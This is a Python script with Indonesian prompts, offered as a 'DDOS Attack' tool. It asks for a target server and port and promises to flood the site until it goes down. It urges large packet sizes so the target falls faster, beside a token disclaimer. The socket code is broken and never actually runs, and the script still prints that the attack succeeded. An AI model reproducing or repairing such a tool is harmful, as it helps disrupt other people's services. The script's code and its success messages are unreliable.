
"""Script yang kami buat bersifat OPEN SOURCE"""

import os, sys, time, socket, string, random, webbrowser
 
os.system('scroll')

print ("\n [*] Memulai Program....\n")
time.sleep(3)
print (" [//////////////////////////////] %0")
time.sleep(3)
print (" [=========/////////////////////] %30")
time.sleep(4)
print (" [==================////////////] %60")
time.sleep(2)
print (" [========================//////] %85")
time.sleep(4)
print (" [==============================] %100\n")
time.sleep(5)
print (" [*] Membuka Program....\n")
time.sleep(3)

print ("#----------------------------------------------------------------#")
print ("<|-----------------------| DDOS Attack |------------------------|>")
print (" | Author:             RX77E, Security Syber Team Indonean      |")
print (" | Spesial Thank's:    RX77E                                    |")
print (" | Github:             https://github.com/Sreetx                |")
print (" | Instagram:          https://www.instagram.com/memelucubikin  |")
print (" |--------------------------------------------------------------|")
print (" |    Jangan gunakan script ini untuk tindak kejahatan. Kami    |")
print (" |    Tidak bertanggung jawab atas apapun yang anda lakukan.    |")
print ("<|--------------------------------------------------------------|>")
print ("#----------------------------------------------------------------#")

print ("""Deskripsi:
Cara kerja tool's DDOS Attack yg kami buat adalah mengirimkan lonjakan tekanan yang sangat besar pada web tersebut sampai web tersebut down. Untuk mengisi menu ke4, sebaiknya anda pasang ukuran yg besar(tergantung pada kuota data anda) agar web target kalian cepat down.""")

enter = input("\n [#] Tekan enter untuk melanjutkan...\n")

host = input("[?] Masukan Alamat Server: ")
port = input("[?] Masukan Port: ")
pesan = input("[?] Masukan Pesan Yang Akan Dikirimkan: ")
paket = input("[?] Berapa ukuran paket yang ingin anda kirimkan(MB): ")
ip = socket.gethostbyname( host )

print ("[*] [Mendapatkan IP: " + ip +"]")
time.sleep(3)
print ("[*] [Ip Terkunci]" )
time.sleep(3)
print ("[*] [Menyerang " + host + "]")

def ddos():
    while 100:
        #pid = os.fork()
        ddos = socket.socket(socket.AF_INET, socket.AF_UNIX, socket.SOCK_STREAM, socket.SOCK_DGRAM, socket.SOCK_RAW)
        paket = random._urandom(50000)
        sent = 40000 + paket
        try:
            paket.bytes(40000 + paket)
            ddos.send(pesan)
            ddos.sendto(bytes, (host, port))
            ddos.paket.sendto((ip, port, host))
            ddos.connect((host, port))
            ddos.sendto((ip, port));
        except socket.gaierror:
            ddos.close()
        for i in range(10, bytes):
            mulai()
            mulai2()
            main()
            ddos()

def acak():
    while 100:
        client = socket.socket(socket.AF_INET, socket.AF_UNIX, socket.SOCK_STREAM, socket.SOCK_DGRAM, socket.SOCK_RAW)
        paket = random._urandom(50000)
        sent = 40000 + paket
        try:
            paket.bytes(40000 + paket)
            client.send(pesan)
            client.sendto(bytes, (host, port))
            client.paket.sendto((ip, port, host))
            client.connect((host, port))
            client.sendto((ip, port));
        except socket.gaierror:
            client.close()
        for i in range(10, bytes):
            mulai()
            mulai2()
            main()
            ddos()
    
    while 100:
        print (" ")
def main():
    len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        acak()
        
def acak2():
    while 100:
        serang = socket.socket(socket.AF_INET, socket.AF_UNIX, socket.SOCK_STREAM, socket.SOCK_DGRAM, socket.SOCK_RAW)
        paket = random._urandom(50000)
        sent = 40000 + paket
        try:
            paket.bytes(40000 + paket)
            serang.send(pesan)
            serang.sendto(bytes, (host, port))
            serang.paket.sendto((ip, port, host))
            serang.connect((host, port))
            serang.sendto((ip, port));
        except socket.gaierror:
            client.close()
        for i in range(10, bytes):
            mulai()
            mulai2()
            main()
            ddos()
    
    while 100:
        print (" ")
def mulai():
    len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        acak2()
        
def acak3():
    while 100:
        melumpuhkan = socket.socket(socket.AF_INET, socket.AF_UNIX, socket.SOCK_STREAM, socket.SOCK_DGRAM, socket.SOCK_RAW)
        paket = random._urandom(50000)
        sent = 40000 + paket
        try:
            paket.bytes(40000 + paket)
            melumpuhkan.send(pesan)
            melumpuhkan.sendto(bytes, (host, port))
            melumpuhkan.paket.sendto((ip, port, host))
            melumpuhkan.connect((host, port))
            melumpuhkan.sendto((ip, port));
        except socket.gaierror:
            print(" [!] Gagal Koneksi")
            print ("[*] Koneksi yang anda lakukan telah selesai")
            client.close()
        for i in range(10, bytes):
            mulai()
            mulai2()
            main()
            ddos()
    
    while 100:
        print (" ")
def mulai2():
    len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        acak3()

print ("[*] [Berhasil Menyerang " + host +"]")
tanya = input("[?] Cek Situs Target? [Y/n]")
if tanya.lower() == 'y':
    print ("[*] Membuka Browser...")
    webbrowser.open(host)
elif tanya.lower() == 'n':
    pass
else:
    print (" [!] Input Yang Anda Masukan Salah")

enter = input("[?] Tekan enter untuk melanjutkan atau keluar")
print ("[?] Ketikan python DDOS_Attack.py di terminal anda jika anda ingin men-DDOS lagi");sys.exit()
